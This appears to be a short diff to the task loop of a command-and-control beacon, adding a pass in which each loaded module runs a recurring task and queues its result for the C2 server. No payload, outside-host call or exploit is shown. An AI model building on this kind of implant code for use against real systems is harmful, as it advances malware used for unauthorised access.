@@ -356,7 +356,16 @@ bool Beacon::taskResultsToCmd(std::string& output)
 // Execute the right module corresponding to the command received from the C2
 bool Beacon::runTasks()
 {
-	// Handle every task adress to this beacon and put results in a list that will be use to create the response message
+	for(auto it = m_moduleCmd.begin() ; it != m_moduleCmd.end(); ++it )
+	{
+		C2Message c2RetMessage;
+		int result = (*it)->recurringExec(c2RetMessage);
+
+		if(result)
+			m_taskResult.push(c2RetMessage);
+	}
+
+	// Handle every task adress to this beacon and put results in a list that will be usse to create the response message
 	while(!m_tasks.empty())
 	{
 		C2Message c2Message = m_tasks.front();
